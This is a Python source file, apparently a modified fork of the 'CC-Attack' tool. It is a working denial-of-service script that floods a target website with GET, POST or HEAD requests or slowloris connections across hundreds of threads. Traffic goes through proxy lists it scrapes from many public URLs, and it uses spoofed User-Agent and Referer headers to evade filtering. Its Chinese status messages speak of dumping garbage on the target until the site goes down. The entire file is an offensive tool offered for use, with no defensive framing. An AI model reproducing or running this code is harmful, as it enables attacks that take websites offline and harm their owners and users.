#!/usr/bin/python3
# Coded by Leeon123
# Updated by Vip3r_Li0n
#Second modification: t.me/QQuorecs
#正在添加新玩具

import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import chardet
import urllib3

# 打印一些信息
print('''

  Author: https://github.com/Leeon123/CC-Attack   
  \033[1;35m Second modification: t.me/QQuorecs \033[0m!
 ==================  CC-attack help list  ====================
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode (cc/post/head/slow)
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
=============================================================
使用前请pip安装 urllib3 pysocks chardet requests
''')
# 定义 HTTP 请求头部信息
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
# 一些假的引用来源信息
referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.am/search?q=",
    "https://www.google.co.ao/search?q=",
    "https://www.google.co.il/search?q=",
]

#默认s5
mode = "cc"
url = ""
proxy_ver = "5"
brute = False
out_file = "proxy.txt"
thread_num = 800
data = ""
cookies = ""
###############################
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
###################################################
# 生成随机数的方法
Intn = random.randint
Choice = random.choice
###################################################

# 构建线程的函数，用于不同类型的攻击模式
def build_threads(mode, thread_num, event, proxy_type):
    if mode == "post":
        for _ in range(thread_num):
            th = threading.Thread(target=post, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "cc":
        for _ in range(thread_num):
            th = threading.Thread(target=cc, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "head":
        for _ in range(thread_num):
            th = threading.Thread(target=head, args=(event, proxy_type,))
            th.daemon = True
            th.start()

# 获取随机的 User-Agent 信息
def getuseragent():
    platform = Choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1',
                    'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os = Choice(['Linux i686', 'Linux x86_64'])
    browser = Choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(Intn(500, 599))
        version = str(Intn(0, 99)) + '.0' + \
            str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(Intn(2020, currentYear))
        month = Intn(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = Intn(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(Intn(1, 72)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(Intn(1, 99)) + '.0'
        engine = str(Intn(1, 99)) + '.0'
        option = Choice([True, False])
        if option == True:
            token = Choice(['.NET CLR', 'SV1', 'Tablet PC',
                           'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

# 生成随机的 URL
def randomurl():
    return str(Intn(0, 271400281257))  # less random, more performance

# 生成请求头部信息的方法
def GenReqHeader(method):
    global data
    global target
    global path
    header = ""
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        if cookies != "":
            connection += "Cookies: "+str(cookies)+"\r\n"
        accept = Choice(acceptall)
        referer = "Referer: "+Choice(referers) + target + path + "\r\n"
        useragent = "User-Agent: " + getuseragent() + "\r\n"
        header = referer + useragent + accept + connection + "\r\n"
    elif method == "post":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + getuseragent() + "\r\n"
        accept = Choice(acceptall)
        if data == "":  # You can enable customize data
            data = str(random._urandom(16))
        length = "Content-Length: " + \
            str(len(data))+" \r\nConnection: Keep-Alive\r\n"
        if cookies != "":
            length += "Cookies: "+str(cookies)+"\r\n"
        header = post_host + accept + refer + content + \
            user_agent + length + "\n" + data + "\r\n\r\n"
    return header

# 解析 URL 的方法
def ParseUrl(original_url):
    global target
    global path
    global port
    global protocol
    original_url = original_url.strip()
    url = ""
    path = "/"  # default value
    port = 80  # default value
    protocol = "http"
    # http(s)://www.example.com:1337/xxx
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    else:
        print("> That looks like not a correct url.")
        exit()
    # http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
    # print(url) #for debug
    tmp = url.split("/")
    website = tmp[0]  # www.example.com:1337/xxx ==> www.example.com:1337
    check = website.split(":")
    if len(check) != 1:  # detect the port
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        # get the path www.example.com/xxx ==> /xxx
        path = url.replace(website, "", 1)

# 提示用户输入选项
def InputOption(question, options, default):
    ans = ""
    while ans == "":
        ans = str(input(question)).strip().lower()
        if ans == "":
            ans = default
        elif ans not in options:
            print("> 语法错误，请重新输入")
            ans = ""
            continue
    return ans

# 不同类型攻击的函数
def cc(event, proxy_type):# 生成请求头部信息
    header = GenReqHeader("get")  # 选择代理
    proxy = Choice(proxies).strip().split(":")
    add = "?"
    if "?" in path:
        add = "&"
    event.wait()
    while True:
        try: # 根据代理类型设置代理
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(100):
                    get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + \
                        target + "\r\n"
                    request = get_host + header
                    sent = s.send(str.encode(request))
                    if not sent:
                        proxy = Choice(proxies).strip().split(":")
                        break
                # s.setsockopt(socket.SO_LINGER,0)
                s.close()
            except:
                s.close()
        except:
            s.close()


def head(event, proxy_type):  # head函数和cc函数类似，负责HEAD请求
    header = GenReqHeader("head")
    proxy = Choice(proxies).strip().split(":")
    add = "?"
    if "?" in path:
        add = "&"
    event.wait()
    while True:
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(100):
                    head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + \
                        target + "\r\n"
                    request = head_host + header
                    sent = s.send(str.encode(request))
                    if not sent:
                        proxy = Choice(proxies).strip().split(":")
                        break  # This part will jump to dirty fix
                s.close()
            except:
                s.close()
        except:  # dirty fix
            s.close()


def post(event, proxy_type):  # post函数和cc函数类似，负责post请求
    request = GenReqHeader("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while True:
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(100):
                    sent = s.send(str.encode(request))
                    if not sent:
                        proxy = Choice(proxies).strip().split(":")
                        break
                s.close()
            except:
                s.close()
        except:
            s.close()

# Updated and fixed by Vip3r_Li0n


def slow_atk_conn(proxy_type, rlock): # slow_atk_conn函数和slow函数执行慢速攻击
    global socket_list
    proxy = Choice(proxies).strip().split(":")
    while 1:
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(3)
            s.connect((str(target), int(port)))
            if str(port) == '443':
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=target)
            s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)
                                                  ).encode("utf-8"))  # Slowloris format header
            s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
            s.send("{}\r\n".format(
                "Accept-language: en-US,en,q=0.5").encode("utf-8"))
            if cookies != "":
                s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
            s.send(("Connection:keep-alive").encode("utf-8"))
            rlock.acquire()
            socket_list.append(s)
            rlock.release()
            return
        except:
            # print("Connection failed")
            s.close()
            # Only change proxy when error, increase the performance
            proxy = Choice(proxies).strip().split(":")


socket_list = []
# Updated and fixed by Vip3r_Li0n


def slow(conn, proxy_type): # slow_atk_conn函数和slow函数执行慢速攻击
    global socket_list
    rlock = threading.Lock()
    for _ in range(conn):
        threading.Thread(target=slow_atk_conn, args=(
            proxy_type, rlock), daemon=True).start()
    while True:
        sys.stdout.write(
            "[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
        sys.stdout.flush()
        if len(socket_list) != 0:
            for s in list(socket_list):
                try:
                    s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
                    sys.stdout.write(
                        "[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
                    sys.stdout.flush()
                except:
                    s.close()
                    socket_list.remove(s)
                    sys.stdout.write(
                        "[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
                    sys.stdout.flush()
            proxy = Choice(proxies).strip().split(":")
            for _ in range(conn - len(socket_list)):
                threading.Thread(target=slow_atk_conn, args=(
                    proxy_type, rlock), daemon=True).start()
        else:
            time.sleep(0.5)


nums = 0


def checking(lines,proxy_type,ms,rlock,):  # 校验代理是否可用
	global nums
	global proxies
	proxy = lines.strip().split(":")
	if len(proxy) != 2:
		rlock.acquire()
		proxies.remove(lines)
		rlock.release()
		return
	err = 0
	while True:
		if err >= 3:
			rlock.acquire()
			proxies.remove(lines)
			rlock.release()
			break
		try:
			s = socks.socksocket()
			if proxy_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == 0:
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			s.settimeout(ms)
			s.connect(("1.1.1.1", 80))
			'''
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)'''
			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms): # check_socks函数检查代理列表的可用性
	global nums
	thread_list=[]
	rlock = threading.RLock()
	for lines in list(proxies):
		if proxy_ver == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
			th.start()
		if proxy_ver == "4":
			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
			th.start()
		if proxy_ver == "http":
			th = threading.Thread(target=checking,args=(lines,0,ms,rlock,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
	#ans = input("> Do u want to save them in a file? (y/n, default=y)")
	#if ans == "y" or ans == "":
	with open(out_file, 'wb') as fp:
		for lines in list(proxies):
			fp.write(bytes(lines,encoding='utf8'))
		fp.close()
	print("> They are saved in "+out_file)
			
def check_list(socks_file):
	print("> 检查代理列表")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i and '#' not in i:
				try:
					socket.inet_pton(socket.AF_INET,i.strip().split(":")[0])#check valid ip v4
					temp_list.append(i)
				except:
					pass
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()


def DownloadProxies(proxy_ver):
    if proxy_ver == "4":
        f = open(out_file, 'wb')
        socks4_api = [
           		"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
			"https://openproxylist.xyz/socks4.txt",
			"https://proxyspace.pro/socks4.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
			"https://api.openproxylist.xyz/socks4.txt",
        ]
        for api in socks4_api:
            try:
                r = requests.get(api, timeout=5)
                f.write(r.content)
            except:
                pass
        f.close()
        try:  # credit to All3xJ
            r = requests.get("https://www.socks-proxy.net/", timeout=5)
            part = str(r.content)
            part = part.split("<tbody>")
            part = part[1].split("</tbody>")
            part = part[0].split("<tr><td>")
            proxies = ""
            for proxy in part:
                proxy = proxy.split("</td><td>")
                try:
                    proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
                except:
                    pass
                fd = open(out_file, "a")
                fd.write(proxies)
                fd.close()
        except:
            pass
    if proxy_ver == "5":
        f = open(out_file, 'wb')
        socks5_api = [
            		"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
			"https://openproxylist.xyz/socks5.txt",
			"https://proxyspace.pro/socks5.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
        ]
        for api in socks5_api:
            try:
                r = requests.get(api, timeout=5)
                f.write(r.content)
            except:
                pass
        f.close()
    if proxy_ver == "0":
        f = open(out_file, 'wb')
        http_api = [
            		"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxyscan.io/download?type=http",
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
			"https://api.openproxylist.xyz/http.txt",
			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
			"http://alexa.lr2b.com/proxylist.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
			"https://proxy-spider.com/api/proxies.example.txt",
			"https://multiproxy.org/txt_all/proxy.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
			"https://openproxylist.xyz/http.txt",
			"https://proxyspace.pro/http.txt",
			"https://proxyspace.pro/https.txt",
			"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
			"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
			"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
			"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
			"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
			"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://rootjazz.com/proxies/proxies.txt",
			"https://sheesh.rip/http.txt",
			"https://www.proxy-list.download/api/v1/get?type=https",
        ]
        for api in http_api:
            try:
                r = requests.get(api, timeout=5)
                f.write(r.content)
            except:
                pass
        f.close()
    print("> 代理列表已保存到 "+out_file)




def main():
    global proxy_ver
    global data
    global cookies
    global brute
    global url
    global out_file
    global thread_num
    global mode
    global target
    global proxies
    target = ""
    check_proxies = False
    download_socks = False
    proxy_type = 5
    durations = 60
    help = False
    print("> accack模式: [cc/post/head/slow/] & 代理下载")
    for n, args in enumerate(sys.argv):
        if args == "-help" or args == "-h":
            help = True
        if args == "-url":
            ParseUrl(sys.argv[n+1])
        if args == "-m" or args == "-mode":
            mode = sys.argv[n+1]
            if mode not in ["cc", "post", "head", "slow"]:
                print("> -m/-mode 方法错误")
                return
        if args == "-v":
            proxy_ver = sys.argv[n+1]
            if proxy_ver == "4":
                proxy_type = 4
            elif proxy_ver == "5":
                proxy_type = 5
            elif proxy_ver == "http":
                proxy_type = 0
            elif proxy_ver not in ["4", "5", "http"]:
                print("> -v 代理设置错误 (only 4/5/http)")
                return
        if args == "-b":
            if sys.argv[n+1] == "1":
                brute = True
            elif sys.argv[n+1] == "0":
                brute = False
            else:
                print("> -b 方法错误")
                return
        if args == "-t":
            try:
                thread_num = int(sys.argv[n+1])
            except:
                print("> -t 必须是整数")
                return
        if args == "-cookies":
            cookies = sys.argv[n+1]
        if args == "-data":
            data = open(sys.argv[n+1], "r", encoding="utf-8",
                        errors='ignore').readlines()
            data = ' '.join([str(txt) for txt in data])
        if args == "-f":
            out_file = sys.argv[n+1]
        if args == "-down":
            try:
                print("> 下载代理中，请稍后")
                download_socks = True
            except KeyboardInterrupt: #Dint work apparently. Fixing later
                print("> 下载中断")
        if args == "-check":
            try:
                check_proxies = True
                print("> 检查代理列表中，请稍后")
            except KeyboardInterrupt: #Dint work apparently. Fixing later
                print("> 检查中断")
        if args == "-s":
            try:
                durations = int(sys.argv[n+1])
            except:
                print("> -s 必须是整数")
                return

    if download_socks:
        DownloadProxies(proxy_ver)

    if os.path.exists(out_file) != True:
        print("没有找到对应文件")
        return
    proxies = open(out_file).readlines()
    check_list(out_file)
    proxies = open(out_file).readlines()
    if len(proxies) == 0:
        print("> 没有找到对应文件")
        return
    print("> 代理数量为: %d" % (len(proxies)))
    if check_proxies:
        check_socks(3)

    proxies = open(out_file).readlines()

    if help:
        PrintHelp()

    if target == "":
        print("> 下载完成 ")
        return
    event = threading.Event()
    print("> 线程启动中...")
    build_threads(mode, thread_num, event, proxy_type)
    event.clear()
    # input("Press Enter to continue.")
    event.set()
    print("> 正在向目标网站扔垃圾...")
    time.sleep(durations)
    print("> Attack 完成")
    print("> 如果网站没噶，请使用其他方法或使用新的代理文件")


try:
    if __name__ == "__main__":
        main()  # Updated and fixed by Vip3r_Li0n
except:
    KeyboardInterrupt
    print("> Exitting! ")
